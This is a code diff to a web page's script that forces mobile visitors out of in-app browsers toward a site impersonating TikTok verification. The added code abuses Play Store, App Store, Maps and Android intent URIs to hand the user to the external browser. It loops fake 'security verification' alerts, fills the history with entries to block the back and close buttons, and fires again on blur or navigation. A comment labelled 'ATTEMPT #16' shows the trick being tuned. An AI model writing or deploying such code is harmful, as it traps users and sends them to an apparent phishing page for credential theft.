@@ -7,53 +7,56 @@
 </head>
 <body>
 
-    <form id="bypassForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_blank" style="display:none;"></form>
-
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function formBreakout() {
+    function storeBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-        const form = document.getElementById('bypassForm');
 
-        // 1. Submit the form (Higher priority than window.location)
-        form.submit();
-
-        // 2. Immediate Protocol Layering
         if (isAndroid) {
-            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
-        } else if (isIOS) {
-            // Attempt a 'Webcal' handover which often triggers a Safari prompt
-            window.location.href = "webcal://" + target.replace("https://", "");
+            // Android: We use the 'Market' intent to search for the URL itself. 
+            // This forces the Play Store to open, and when it fails to find an app, 
+            // it often offers to open the 'search' in Chrome.
+            window.location.href = "market://search?q=" + encodeURIComponent(target) + "&c=apps";
             
             setTimeout(() => {
-                window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            }, 50);
+                window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
+            }, 100);
+
+        } else if (isIOS) {
+            // iOS: The 'itms-apps' search protocol. 
+            // This hits the system level and usually pops the "Open in App Store?" dialog.
+            window.location.href = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + encodeURIComponent(target);
+            
+            setTimeout(() => {
+                // Secondary jump to Safari via a Maps-bypass protocol
+                window.location.href = "maps://?q=" + encodeURIComponent(target);
+            }, 100);
         }
     }
 
     function rampage() {
         if (Date.now() > killTime) return; // FAIL-SAFE
 
-        formBreakout();
+        storeBreakout();
 
-        // FIXED ALERT FOR ATTEMPT #15
-        alert("ATTEMPT #15\n\nSecurity verification required.\n\nTap OK to open in your system browser.");
+        // FIXED ALERT FOR ATTEMPT #16
+        alert("ATTEMPT #16\n\nSystem browser handover required.\n\nTap OK to continue.");
         
-        formBreakout();
+        storeBreakout();
 
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // High-density history jam
-        for(let i=0; i<100; i++) history.pushState({idx:i}, "", "#verify_" + i);
+        // High-density history jam to trap the "X" button
+        for(let i=0; i<120; i++) history.pushState({state:i}, "", "#auth_" + i);
         rampage();
     };
 
-    // Prevent 'X' button or swipe escape
+    // Re-trigger on any attempt to close or blur
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
     window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
 </script>
